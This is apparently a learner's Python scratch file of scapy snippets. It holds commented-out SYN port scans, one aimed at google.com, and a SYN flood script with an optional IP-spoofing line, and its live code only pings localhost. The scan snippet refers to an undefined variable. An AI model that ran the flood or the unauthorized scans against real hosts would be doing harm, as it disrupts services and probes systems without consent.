# import logging
# logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
# import sys
# from scapy.all import *

# target = "google.com"
# port = 443
# print("Scanning "+target+" for the desired port and its status")

# packet = IP(dst=target)/TCP(dport=port, flags='S')
# response = sr1(packet, timeout=0.5, verbose=0)
# if response.haslayer(TCP) and response.getlayer(TCP).flags==0x12:
#     print("Port",port,"is open")
#     sr(IP(dst=target)/TCP(dport=response.sport, flags='R'), timeout=0.5, verbose=0)
# print("Scan complete")
# import logging
# logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
# from scapy.all import *

# dst_ip = "198.168.0.19"
# src_port = RandShort()
# dst_port=80

# tcp_connect_scan_resp = sr1(IP(dst=dst_ip)/TCP(sport=src_port,dport=dst_port,flags="S"),timeout=0.5, verbose=0)
# print(str(type(tcp_connect_scan_resp)))
# if(str(type(tcp_connect_scan_resp))=="<class 'NoneType'>"):
#     print("Closed")
# elif(tcp_connect_scan_resp.haslayer(TCP)):
#     if(tcp_connect_scan_resp.getlayer(TCP).flags == 0x12):
#         send_rst = sr(IP(dst=dst_ip)/TCP(sport=src_port,dport=dst_port,flags="AR"),timeout=0.5, verbose=0)
#         print ("Open")
#     elif (tcp_connect_scan_resp.getlayer(TCP).flags == 0x14):
#         print ("Closed")
# elif(stealth_scan_resp.haslayer(ICMP)):
#     if(int(stealth_scan_resp.getlayer(ICMP).type)==3 and int(stealth_scan_resp.getlayer(ICMP).code) in [1,2,3,9,10,13]):
#         print("Filtered")

# from scapy.all import *
 
# # target IP address (should be a testing router/firewall)
# target_ip = "127.0.0.1"
# # the target port u want to flood
# target_port = 65432
 
# # forge IP packet with target ip as the destination IP address
# ip = IP(dst=target_ip)
# # or if you want to perform IP Spoofing (will work as well)
# # ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
 
# # forge a TCP SYN packet with a random source port
# # and the target port as the destination port
# tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
 
# # add some flooding data (1KB in this case)
# raw = Raw(b"X"*1024)
 
# # stack up the layers
# p = ip / tcp / raw
# # send the constructed packet in a loop until CTRL+C is detected 
# for x in range(0, 500):
#     send(p, loop=0, verbose=0)
#     print(".", end="", flush=True)

from scapy.all import *

target = "127.0.0.1"
cycle = 10
if cycle == "":
    cycle = 100

for x in range (0,int(cycle)):
    send(IP(dst=target)/ICMP(), verbose=0)
    print(".", end="", flush=True)